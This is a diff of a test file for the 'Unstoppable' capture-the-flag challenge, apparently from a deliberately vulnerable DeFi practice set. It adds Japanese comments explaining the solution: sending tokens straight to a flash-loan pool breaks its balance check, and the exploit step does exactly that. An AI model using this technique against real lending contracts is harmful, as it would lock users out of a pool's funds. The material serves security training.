@@ -41,12 +41,15 @@ describe('[Challenge] Unstoppable', function () {
         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+        //flash loanを実行する
         await this.receiverContract.executeFlashLoan(10);
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
         const attackTokenContract = this.token.connect(attacker);
+        //poolにいくらか送ったら、depositTokensで更新されるpoolBalance
+        //とDVT.balanceof(pool)が一致しなくなる
         await attackTokenContract.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
     });
 
